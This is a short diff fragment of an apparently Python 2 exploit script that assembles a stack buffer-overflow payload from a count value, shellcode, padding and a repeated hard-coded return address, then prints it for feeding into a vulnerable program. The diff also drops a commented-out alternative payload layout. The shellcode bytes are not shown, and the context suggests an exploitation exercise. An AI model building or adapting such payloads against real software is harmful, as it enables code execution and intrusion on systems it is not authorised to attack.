@@ -5,4 +5,3 @@ count = 0x40000000
 shellcodeAdd = 0xbffef200
 print pack("<I", count) + shellcode + '\x00' + pack("<I", shellcodeAdd) * (0x59 - len(shellcode))
 
-# print pack("<I", count) + shellcode + 'X' * (2056 - len(shellcode) - 8) + pack("<I" , shellcodeAdd) + pack("<I", returnAdd)
